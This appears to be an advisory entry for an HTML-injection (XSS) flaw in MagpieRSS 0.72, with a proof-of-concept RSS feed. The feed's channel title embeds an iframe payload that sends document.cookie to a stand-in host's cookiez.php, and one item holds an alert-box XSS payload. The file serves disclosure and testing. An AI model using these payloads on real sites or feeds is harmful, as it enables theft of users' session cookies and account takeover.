@@ -1,0 +1,28 @@
+source: http://www.securityfocus.com/bid/33044/info
+
+MagpieRSS is prone to an HTML-injection vulnerability because the application fails to properly sanitize user-supplied input before using it in dynamically generated content.
+
+Attacker-supplied HTML and script code would run in the context of the affected browser, potentially allowing the attacker to steal cookie-based authentication credentials or to control how the site is rendered to the user. Other attacks are also possible.
+
+MagpieRSS 0.72 is vulnerable; other versions may also be affected.
+
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+
+<channel>
+<title><![CDATA["><iframe src="javascript:window.location=&#039;http://www.example.com/cookiez.php?c=&#039;+document.cookie"></iframe><a lol="]]></title>
+<description>XSS test</description>
+
+<item>
+<title><![CDATA[z0mG?!]]></title>
+<link><![CDATA[what teh hax?!]]></link>
+
+<description>
+<![CDATA[
+"><iframe src="javascript:alert(/xss/)"></iframe>
+]]>
+</description>
+</item>
+
+</channel>
+</rss>
